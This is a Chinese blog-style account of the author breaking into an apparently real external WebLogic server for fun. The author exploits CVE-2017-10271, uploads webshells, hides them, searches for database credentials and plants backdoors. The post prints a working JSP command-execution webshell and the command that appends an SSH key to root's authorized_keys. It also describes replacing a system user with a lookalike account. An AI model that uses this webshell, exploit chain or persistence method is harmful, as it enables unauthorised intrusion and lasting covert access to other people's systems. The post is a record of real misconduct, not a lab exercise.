本次目标 -- http://xx.xx.xx.xx:9001
周末闲来无事，日日站打发打发时间，废话不多说，开干，先对目标站点进行端口扫描


访问这两个端口（看到这个页面就觉得很幸运）





http://xx.xx.xx.xx:9001/ -- Weblgoic中间件

http://xx.xx.xx.xx:8888/ -- Oracle数据库


Weblgoic中间件爆出过这么多漏洞，肯定要先对Weblgoic下手，直接上Weblogic扫描工具批量检测


工具地址：https://github.com/0xn0ne/weblogicScanner



扫描结果发现存在CVE-2017-10271漏洞（Weblogic XML Decoder反序列化漏洞）


手工再确定一下，访问漏洞地址：
http://xx.xx.xx.xx:9001/wls-wsat/CoordinatorPortType


Weblogic XML Decoder反序列化漏洞的漏洞地址如下：

/wls-wsat/CoordinatorPortType/wls-wsat/RegistrationPortTypeRPC/wls-wsat/ParticipantPortType/wls-wsat/RegistrationRequesterPortType/wls-wsat/CoordinatorPortType11/wls-wsat/RegistrationPortTypeRPC11/wls-wsat/ParticipantPortType11/wls-wsat/RegistrationRequesterPortType11


确定漏洞存在，接着使用shack2师傅的漏洞利用工具获取Weblogic中间件根目录



得到 Weblogic 中间件绝对路径：


/u01/Middleware/user_projects/domains/AsconDomain/servers/WLS_FORMS/tmp/_WL_internal/wls-wsat/tcsxmg/war


利用此工具进行文件上传，尝试上传冰蝎马




使用冰蝎连接，发现连接失败，原因不明，初步有以下判断：

  1. 连接超时（因为这是一个外站，位于德国，所以有可能响应时间过长导致请求失败，我觉得这个可能性不是很大）

  2. 安全防护软件拦截




尝试上传info.txt，内容为test。（确定了上传的文件能够落地）


上传一个简单的webshell文件web_config.jsp

内容如下：

<%@ page import="java.io.*" %><%String cmd = request.getParameter("cmd");String output = "";if(cmd != null) {String s = null;try {Process p = Runtime.getRuntime().exec(cmd,null,null);BufferedReader sI = new BufferedReader(new  InputStreamReader(p.getInputStream()));while((s = sI.readLine()) != null) { output += s+"</br>"; }} catch(IOException e) { e.printStackTrace(); }}%><pre><%=output %></pre> 





发现并没有进行拦截，那到这里我还是无法确定冰蝎连接失败的原因。换个webshell管理工具，使用哥斯拉生成webshell并上传sec_config.jsp试试





上传成功，再尝试测试连接，显示成功，进入webshell看看



Getshell成功，得到目标系统的基础信息






可能会有读者问，明明利用工具就可以命令执行，干嘛还大费周章弄webshell。上传webshell是为了更好管理这个shell，便于我更好进行权限维持。这里先将web_config.jsp做隐藏。（隐藏文件使用ls -al就能排查出来）


接着内网信息收集，翻翻文件，看看Weblogic数据库连接池的配置文件

接着又翻了很久的文件，但是都无果，既然不能再扩大危害面。只好做个权限维持，随意留下几个后门就溜了。



第一个后门：先是发现系统有一个 bolbol 的用户，于是我添加了一个 bolbo1 的用户，把原本的bolbol用户删了。

第二个后门：SSH公私钥免密登录



id_rsa 为私钥，id_rsa.pub 为公钥，将 id_rsa.pub 文件内容追加到目标服务器的/root/.ssh/authorized_keys内，即可完成



## 追加文件内容echo "xxx" >> /root/.ssh/authorized_keys
